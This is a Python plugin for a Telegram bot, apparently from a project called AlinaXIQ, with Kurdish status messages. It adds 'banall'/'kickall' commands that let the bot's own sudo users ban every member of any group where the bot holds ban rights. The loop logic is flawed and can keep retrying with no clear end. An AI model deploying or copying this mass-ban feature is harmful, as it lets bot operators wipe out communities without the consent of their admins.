import asyncio

from AlinaXIQ import app
from AlinaXIQ.misc import SUDOERS
from pyrogram import filters
from pyrogram.errors import FloodWait

BOT_ID = app.id


async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
    banned_count = 0
    failed_count = 0
    ok = await msg.reply_text(
        f"**کۆی گشتی ئەندامی دۆزراوە: {total_members}\nدەستی پێکرد**"
    )

    while failed_count <= 30:
        async for member in app.get_chat_members(chat_id):
            if failed_count > 30:
                break  # Stop if failed bans exceed 30

            try:
                if member.user.id != user_id and member.user.id not in SUDOERS:
                    await app.ban_chat_member(chat_id, member.user.id)
                    banned_count += 1

                    if banned_count % 5 == 0:
                        try:
                            await ok.edit_text(
                                f"**دەکرا {banned_count} ئەندام لە {total_members}**"
                            )
                        except Exception:
                            pass  # Ignore if edit fails

            except FloodWait as e:
                # Wait for the flood time and continue
                await asyncio.sleep(e.x)
            except Exception:
                failed_count += 1

        if failed_count <= 30:
            await asyncio.sleep(
                5
            )  # Retry every 5 seconds if failed bans are within the limit

    await ok.edit_text(
        f"**کۆی گشتی دەکراو: {banned_count}\nدەرنەکراو: {failed_count}\nوەستا بەهۆی سنووری دەرکردن.**"
    )


@app.on_message(filters.command(["banall", "kickall"]) & SUDOERS)
async def ban_all(_, msg):
    chat_id = msg.chat.id
    user_id = msg.from_user.id  # ID of the user who issued the command

    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members

    if bot_permission:
        total_members = 0
        async for _ in app.get_chat_members(chat_id):
            total_members += 1

        await ban_members(chat_id, user_id, bot_permission, total_members, msg)

    else:
        await msg.reply_text(
            "**ببورە تۆ گەشەپێدەر یان خاوەنی بۆت نییت**"
        )
